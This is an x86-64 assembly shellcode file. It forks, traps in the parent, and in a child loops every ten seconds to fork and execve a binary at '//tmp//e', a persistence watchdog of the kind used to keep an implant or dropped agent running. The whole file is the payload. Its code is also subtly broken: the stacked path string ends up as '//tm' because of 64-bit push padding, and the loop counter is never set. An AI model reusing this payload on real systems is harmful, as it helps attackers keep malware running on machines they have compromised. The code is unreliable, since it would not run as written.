	BITS 64

	section .text
	global  _start

_start:
	;;  fork
	xor rax, rax
	xor rdi, rdi
	mov al, 0x39; syscall fork
	syscall

	cmp rax, 0x0; check return value
	jg  pause; int3 if in parent

watchdog:
	;;  fork to exec agent
	xor rax, rax
	xor rdi, rdi
	mov al, 0x39; syscall fork
	syscall
	cmp rax, 0x0; check return value
	je  exec; exec if in child

	;;   sleep
	mov  rax, 0
	mov  al, 0x23; syscall nanosleep
	push 10; sleep sec
	push 10
	mov  rdi, rsp
	xor  rsi, rsi; no more args
	xor  rdx, rdx
	syscall
	loop watchdog

exec:
	xor  rax, rax
	xor  rdi, rdi
	mov  al, 0x3b; syscall execve
	push rax; '\0' string terminator
	push 0x652f2f70; "e\/\/p"
	push 0x6d742f2f; "mt\/\/"
	mov  rdi, rsp; pointer to "\/\/tmp\/\/e"
	mov  rsi, 0
	mov  rdx, 0
	syscall
	ret

pause:
	;;  trap
	int 0x3

	; exit:
	; ;; exit
	; xor rax, rax
	; xor rdi, rdi
	; xor rsi, rsi
	; mov al, 0x3c; syscall exit
	; mov di, 0x0; exit code
	; syscall
